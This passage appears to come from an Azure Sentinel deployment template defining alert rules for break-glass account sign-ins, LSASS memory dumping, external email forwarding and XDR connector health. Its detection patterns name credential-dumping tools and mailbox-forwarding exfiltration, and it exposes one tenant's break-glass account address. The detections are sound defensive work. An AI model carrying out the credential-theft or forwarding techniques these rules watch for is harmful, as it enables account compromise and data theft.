field.\n// This regex extracts the number between \"%ASA-\" and the following dash.\n| extend ASA_Severity = toint(extract(\"^%ASA-([0-9]+)-\", 1, EventMessage))\n// Uncomment the following line to filter only high-severity ASA logs (0-3)\n| where ASA_Severity in (0, 1, 2, 3, 4)\n| project\n    imNWS_mintime, \n    imNWS_maxtime, \n    Description, \n    IndicatorId, \n    ThreatType, \n    LogSeverity, \n    ExpirationDateTime, \n    SrcIpAddr, // Source = TI_ipEntity\n    SrcPortNumber,\n    DstIpAddr, \n    DstPortNumber, \n    IoCDirection, // Direction of IOC match (Source/Destination)\n    CommunicationDirection, // Direction of communication (e.g., inbound/outbound)\n    EventOriginalResultDetails, \n    DvcAction, \n    DeviceEventClassID, \n    SimplifiedDeviceAction, \n    TI_ipEntity, // Source = TI_ipEntity\n    EventMessage, \n    EventProduct, \n    NetworkDirection, // Network direction (e.g., inbound/outbound)\n    Rule, // Rule that triggered the event\n    Dvc;\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ed72a008-7f0f-44c8-be3b-9fe583247d8a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ed72a008-7f0f-44c8-be3b-9fe583247d8a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] Break Glass Account Access Alert",
          "description": "This rule monitors Azure Active Directory (Azure AD) sign-in logs to detect any successful access to designated break glass accounts. Break glass accounts are reserved for emergency administrative access and should only be used under critical circumstances. Any access to these accounts may indicate either an approved emergency action or an unauthorized security incident. When this rule is triggered, it immediately alerts the security operations team to investigate the access for any suspicious activity. The alert includes key details such as the time of access, the user account, the IP address, and the geographic location.",
          "severity": "High",
          "enabled": true,
          "query": "SigninLogs\n| where UserPrincipalName == \"qtUQecum8DsXFVM64Va6dzmS@cadcss.onmicrosoft.com\"\n| where ResultType == 0  // Successful sign-ins\n| project TimeGenerated, UserPrincipalName, IPAddress, Location\n\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-21005')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-21005')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-21005: [SOC] Windows - Suspicious LSASS Process Memory",
          "description": "Detects object access for file handles being opened from memory dumping processes to Lsass.exe. This is done to create a minidump of the lsass.exe process memory space for offline parsing with mimikatz and other credential dumping tools. MITRE: T1003 Category: Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nlet EventIDList = dynamic([4656]);\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});      \nlet exclusions = array_concat(global_config['EXCLUSION'], BV21005_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV21005_CONFIG['RBASCORE']),1.0);\nlet excluded_description_fields = dynamic(['bv_raw','bv_dedup_fields', 'bv_alarm_rba_score', 'bv_dedup_hash']);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n  let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n  | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n      let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n  | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n      table_parameter\n      | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n      | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n      | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n      | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n      | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n      | extend ModifiedRBAScore = case(\n        ModifiedRBAScore > 10, 10.0\n        , ModifiedRBAScore <0.1, 0.1\n        , ModifiedRBAScore\n      )\n      | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};    \nSecurityEvent\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend AccessList = extract(@'<Data Name=\"AccessList\">(.*?)</Data>', 1, EventData)\n| extend bv_object = extract(@'<Data Name=\"ObjectName\">(.*?)</Data>', 1, EventData)\n| extend AccessMask = extract(@'<Data Name=\"AccessMask\">(.*?)</Data>', 1, EventData)\n| extend bv_process = extract(@'<Data Name=\"ProcessName\">(.*?)</Data>', 1, EventData)\n| extend bv_src_user = extract(@'<Data Name=\"SubjectUserName\">(.*?)</Data>', 1, EventData)\n| extend bv_src_user_id = extract(@'<Data Name=\"SubjectUserSid\">(.*?)</Data>', 1, EventData)\n| where bv_object has 'lsass.exe' and bv_process has_any ('taskmgr.exe', 'rundll32.exe', 'processdump.exe', 'procdump.exe')\n| where AccessMask has_any ('0x1010', '0x10')\n| project \n    bv_user = bv_src_user\n    , bv_src_user\n    , bv_src_user_id\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_raw = EventData\n    , bv_event_id = EventID\n    , bv_process\n    , bv_object\n    , bv_object_category = 'process'\n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count(), bv_process = make_set(bv_process, 10) by bv_user\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-21005')\n| invoke description(excluded_description_fields)\n| extend bv_alarm_victim_entities = pack_array(bv_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n| extend bv_mapping_tag = bv_src_user\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription          ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Detects object access for file handles being opened from memory dumping processes to Lsass.exe. This is done to create a minidump of the lsass.exe process memory space for offline parsing with mimikatz and other credential dumping tools.\n\n{{ExtendedDescription}}\n\ntag: SOC\nCategory: Windows Security\nMITRE: T1003"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-627')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-627')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-627: [SOC] O365 - Email Forwarding Rule Set by User",
          "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u00e2\u20ac\u2122s organization to use as part of further exploits or operations.[1] Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2] Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes\n\nThis alert notifies when a user has set an inter-domain email forwarding rule that is not listed in the approved list of domains\n\nExclusions: A627_EXCLUDED_DOMAINS \n\nRecommendations:\n  1. Validate user created the mail forwarding rule and is authorized to forward to domain MITRE: T1114 Category: Microsoft Defender XDR tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let OperationDescriptions = datatable(Operation:string, OperationDescription:string)[\n    'Set-InboxRule','set an inbox forwarding rule'\n    , 'New-InboxRule','create an inbox forwarding rule'\n    , 'Set-Mailbox', 'set a mail box forwarding'\n    , 'UpdateInboxRules', 'updated an inbox rule'\n];\nlet start_time = 1h;\nlet latency = 24h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_alarm_rba_score']);\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nOfficeActivity\n| where TimeGenerated between(ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where Operation in ('Set-InboxRule', 'Set-Mailbox', 'UpdateInboxRules','New-InboxRule')\n| extend OperationProperties = column_ifexists('OperationProperties', '')\n| where Parameters has_any ('ForwardTo', 'ForwardingSmtpAddress') or OperationProperties has_any('Forward')\n| extend ParsedOperationProperties = parse_json(OperationProperties)\n| mv-apply p = ParsedOperationProperties on \n    (\n    extend\n        RuleActions = iff(p.Name == 'RuleActions', p.Value, '')\n        ,\n        RuleName = iff(p.Name == 'RuleName', p.Value, '')\n        ,\n        RuleCondition = iff(p.Name == 'RuleCondition', p.Value, '')\n    | summarize\n        RuleActions=take_any(RuleActions),\n        RuleNames = take_any(RuleName),\n        RuleConditions = take_any(RuleCondition)\n    )\n| mv-apply a = todynamic(RuleActions) to typeof(dynamic) on \n    (\n    extend Recipients = iff(a.ActionType == 'Forward', a.Recipients, '')\n    | mv-apply r=todynamic(Recipients) on \n        (\n        parse r with * '@' RecipientDomains\n        |extend RecipientDomains = tolower(RecipientDomains)\n        | summarize RecipientDomains=make_set_if(RecipientDomains, isnotempty(RecipientDomains))\n        )\n    | summarize\n        Recipients=make_set(todynamic(Recipients)),\n        RecipientDomains=make_set_if(RecipientDomains, isnotempty(RecipientDomains))\n    )\n| extend ParsedParameters = parse_json(Parameters)\n| mv-apply p= ParsedParameters on\n    (\n    extend ForwardingSmtpAddress = iff(p.Name == 'ForwardingSmtpAddress' and isnotempty(p.Value), p.Value, '')\n    | extend ForwardTo = iff(p.Name == 'ForwardTo' and isnotempty(p.Value), p.Value, '')\n    | parse ForwardingSmtpAddress with * '@' SmtpDomain\n    | parse ForwardTo with * '@' ForwardToDomains\n    | extend Domain = iff(isnotempty(SmtpDomain), SmtpDomain, ForwardToDomains)\n    | summarize\n        ForwardingSMTP=make_set_if(ForwardingSmtpAddress, isnotempty(ForwardingSmtpAddress)),\n        ForwardToDomains=make_set_if(ForwardToDomains, isnotempty(ForwardToDomains)),\n        ForwardTo=make_set_if(split(ForwardTo, ';'), isnotempty(ForwardTo)),\n        Domains = make_set_if(Domain, isnotempty(Domain))\n    )\n| extend Recipients=array_concat(Recipients, ForwardingSMTP, ForwardTo)\n| extend RecipientDomains=array_concat(RecipientDomains, Domains, ForwardToDomains)\n| where array_length(RecipientDomains) > 0\n| summarize\n    TimeGenerated=min(TimeGenerated),\n    RecipientDomains=make_set(RecipientDomains),\n    Recipients=make_set(Recipients),\n    RuleActions = make_set(RuleActions),\n    RuleNames = make_set(RuleNames),\n    RuleConditions = make_set(RuleConditions)\n    by\n    UserType,\n    OfficeObjectId,\n    UserId,\n    ClientIP,\n    Parameters,\n    Operation,\n    bin_at(TimeGenerated, alert_bin, now())\n| parse UserId with AccountName '@' AccountDnsDomain\n| parse OfficeObjectId with OfficeObject @'\\' * \n//post-extraction format cleanup '\n| extend AccountName = coalesce(AccountName, OfficeObject)\n| extend NewDestinationDomain = set_difference(RecipientDomains, A627_EXCLUDED_DOMAINS)\n| extend DestDomainExclusion = iif(array_length(NewDestinationDomain) == 0 or 'excludedDomains.comm' in~ (A627_EXCLUDED_DOMAINS) or NewDestinationDomain contains AccountDnsDomain, true, false)\n| where not(DestDomainExclusion)\n| join kind=leftouter OperationDescriptions on Operation\n| extend bv_alarm_attacker_entities = pack_array(UserId, ClientIP)\n| extend bv_alarm_victim_entities = pack_array(UserId)\n| extend bv_rule_version = '1.3.4849'\n| extend bv_rule_timestamp = '1707754592.6723828'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.4849 bv_rule_timestamp: 1707754592.6723828'\n| project \n    bv_start_time = TimeGenerated\n    , bv_user = UserId\n    , bv_src_ip = ClientIP\n    , bv_object_id = OfficeObjectId\n    , bv_vendor_action = Operation\n    , bv_recipient = Recipients\n    , bv_recipient_domain = RecipientDomains\n    , bv_dest_domain_excluded =  DestDomainExclusion\n    , bv_dest_domain_new = NewDestinationDomain\n    , bv_user_domain = AccountDnsDomain\n    , bv_alarm_attacker_entities\n    , bv_alarm_victim_entities\n    , bv_alarm_rba_score = 1\n    , bv_rule_names = RuleNames                \n    , bv_rule_actions = RuleActions\n    , bv_rule_conditions = RuleConditions\n    , bv_rule_combined_string\n| extend bv_mapping_tag = bv_user       \n| invoke description(excluded_description_fields, 300, 5)\n| project-keep\n    bv_*\n    , ExtendedDescription  ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT25H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Collection"
          ],
          "techniques": [
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-627: [SOC] O365 - Email Forwarding Rule Set by {{bv_user}}",
            "alertDescriptionFormat": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u00e2\u20ac\u2122s organization to use as part of further exploits or operations.[1] Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators.[2] Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes\n\n{{ExtendedDescription}}\n\nThis alert notifies when a user has set an interdomain email forwading rule that is not listed in the approved list of domains\n\nExclusions: A627_EXCLUDED_DOMAINS \n\nRecommendations:\n  1. Validate user created the mail forwarding rule and is authorized to forward to domain\n\nMITRE: T1114\nCategory: Office 365\ntag: SOC\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9380')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9380')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9380: [Health] - Silent - XDR Connector Offline",
          "description": "This alert identifies when a previously-on Microsoft XDR connector is not generating incidents MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 12d;\nlet end_time = now();  \nlet suppression_time=1d; \nlet RecentAlerts = toscalar(SecurityAlert\n| where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-9380:'\n  |parse DisplayName with * ' offline ' connector_name\n  |summarize  eventcount=count()\n  );\n    union isfuzzy=true\n        (SecurityIncident\n        |where TimeGenerated > ago(start_time) and TimeGenerated < end_time \n        |extend Count = 0\n        | where ProviderName == \"Microsoft 365 Defender\" or ProviderName == \"Microsoft XDR\"\n        | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n    | project Value = iff(isnull(Count), 0, Count), Time = TimeGenerated, Legend = \"Incidents\")\n    ,\n    (\n        union isfuzzy=true \n            (SecurityAlert \n            |where TimeGenerated > ago(start_time) and TimeGenerated < end_time \n            |extend Count = 0\n            | where ProductName in(\"Microsoft Defender Advanced Threat Protection\", \"Office 365 Advanced Threat Protection\", \"Azure Advanced Threat Protection\", \"Microsoft Cloud App Security\", \"Microsoft 365 Defender\")\n            | extend alertWasCustomized = bag_has_key(todynamic(ExtendedProperties), \"OriginalProductName\")\n            | where alertWasCustomized == false\n            | summarize Count = count() , TimeGenerated=max(TimeGenerated))\n        | project Value = iff(isnull(Count), 0, Count), Time = TimeGenerated, Legend = \"Alerts\")\n    ,\n    (union isfuzzy=true\n            (DeviceEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceFileEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceImageLoadEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceLogonEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceNetworkEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceNetworkInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceProcessEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceRegistryEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(DeviceFileCertificateInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n        | project\n            Value = iff(isnull(Count), 0, Count),\n            Time = TimeGenerated,\n            Legend = \"Endpoint Events\")\n    ,\n    (union isfuzzy=true\n            (EmailEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(EmailUrlInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(EmailAttachmentInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(EmailPostDeliveryEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(UrlClickEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n        | project\n            Value = iff(isnull(Count), 0, Count),\n            Time = TimeGenerated,\n            Legend = \"Office Events\")\n    ,\n    (union isfuzzy=true\n            (IdentityLogonEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(IdentityQueryEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(IdentityDirectoryEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n        | project\n            Value = iff(isnull(Count), 0, Count),\n            Time = TimeGenerated,\n            Legend = \"Identity Events\")\n    ,\n    (CloudAppEvents |where TimeGenerated > ago(start_time) and TimeGenerated < end_time \n            | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n                | project\n            Value = iff(isnull(Count), 0, Count),\n            Time = TimeGenerated,\n            Legend = \"Cloud app Events\")\n    ,\n    (union isfuzzy=true\n            (AlertInfo |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            ,(AlertEvidence |where TimeGenerated > ago(start_time) and TimeGenerated < end_time )\n            | summarize Count = count() , TimeGenerated=max(TimeGenerated)\n        | project\n            Value = iff(isnull(Count), 0, Count),\n            Time = TimeGenerated,\n            Legend = \"Defender Alerts\")\n    |where Value != 0\n    |extend alert_details = strcat (Value, ' events for ', Legend)\n    |summarize last_incident=max(Time),first_incident=min(Time), unique_incident_count=sum(Value), defender_sources=make_set(alert_details), provider_set=make_set(Legend)\n    |extend provider_list = array_sort_asc(provider_set)\n    |extend previous = 1\n    // blanket dedup if previous 9380 exists in previous 1d\n    |where previous !in (RecentAlerts)\n    |extend total_hours_activity=round((now() - first_incident)/1h, 2)\n          |extend total_days_activity=round(total_hours_activity / 24, 2)\n          |extend avg_daily_incident= round(unique_incident_count / 12, 3)\n          |extend hours_since_last_incident = round((now() - last_incident)/1h, 2)\n          |where unique_incident_count > 0\n          |extend bv_alarm_threshold= case(\n                  (avg_daily_incident >= 0 and avg_daily_incident < 10) , 168\n                  ,(avg_daily_incident >= 10 and avg_daily_incident < 1000) , 24\n                  ,(avg_daily_incident >= 1000 ) , 8  \n                  ,unique_incident_count == 1, 168\n                  ,168 \n                  )\n                  |extend day_of_week = toint(dayofweek(now())/1d)\n          |extend day_name = case(\n              day_of_week == '1', 'monday'\n              ,day_of_week == '2', 'tuesday'\n              ,day_of_week == '3', 'wednesday'\n              ,day_of_week == '4', 'thursday'\n              ,day_of_week == '5', 'friday'\n              ,day_of_week == '6', 'saturday'\n              ,day_of_week == '0', 'sunday'\n              ,'other')\n          |extend alert_multiplier = case(day_name == 'sunday', toreal(1.5)\n                ,day_name == 'monday', toreal(1.5)\n                ,toreal(1))\n          |extend bv_alarm_threshold = toreal(bv_alarm_threshold)\n          |extend bv_alarm_threshold = bv_alarm_threshold * alert_multiplier    \n    //check for offline threshold\n    |where hours_since_last_incident > bv_alarm_threshold\n          |extend bv_src_dvc = tostring(provider_list)\n              ,bv_reporting_dvc = tostring(provider_list)\n          | extend Tags = 'tag: Health'\n          |extend ExtendedDescription = strcat('The Microsoft XDR connector ', bv_src_dvc, ' has gone ', hours_since_last_incident,' hours without sending an incident to the SecurityIncident table\\n', 'The threshold for this connector not sending alerts is ', bv_alarm_threshold, ' hours for this environment, and this connector typically sends ', avg_daily_incident, ' incidents per day.\\n Please ensure that the connector is enabled and online.')\n          |extend bv_start_time = now()\n          //, bv_end_time = \n          , bv_mss_category = 'LogSource Disruption'\n          , bv_alarm_type = 'Silent Provider'\n          , bv_alarm_sub_type = 'EFD v1.0'\n          , bv_alarm_name = 'BV-9380'\n          , sourcetype = 'XDR tables'\n          , bv_alarm_value = strcat(hours_since_last_incident, ' hours')\n          , bv_severity = 'high'\n          | extend bv_rule_combined_string = 'bv_rule_version: 1.0.5356 bv_rule_timestamp: 1718642228.441924'\n          |extend bv_src_dvc = todynamic(bv_src_dvc)\n          |extend bv_src_dvc=bv_src_dvc.[0]\n          |project-keep avg_daily_incident, unique_incident_count, ExtendedDescription, Tags, sourcetype, bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P12D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
